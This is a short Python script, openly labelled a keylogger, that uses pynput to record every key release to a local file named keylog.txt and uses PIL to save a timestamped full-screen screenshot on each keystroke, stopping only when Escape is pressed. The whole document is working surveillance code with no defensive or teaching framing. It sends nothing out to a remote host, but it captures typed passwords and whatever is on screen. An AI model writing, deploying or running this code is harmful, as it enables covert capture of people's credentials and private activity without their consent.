from pynput import keyboard
from PIL import ImageGrab
import time

# Log the start of a new session
f = open("keylog.txt", "a")
f.write("\n\nNew session started\n")
f.close()

# Function to take a screenshot
def take_screenshot():
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot_{timestamp}.png")

# Function to handle key release events
def on_release(key):
    st = ""
    st += str(key).replace("'", "")
    
    # Take a screenshot on every key press
    take_screenshot()

    # Stop the keylogger if the escape key is pressed
    if str(key) == "Key.esc":
        return False
    
    # Log the key press
    f = open("keylog.txt", "a")
    f.write(st)
    f.close()

# Start the keyboard listener
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
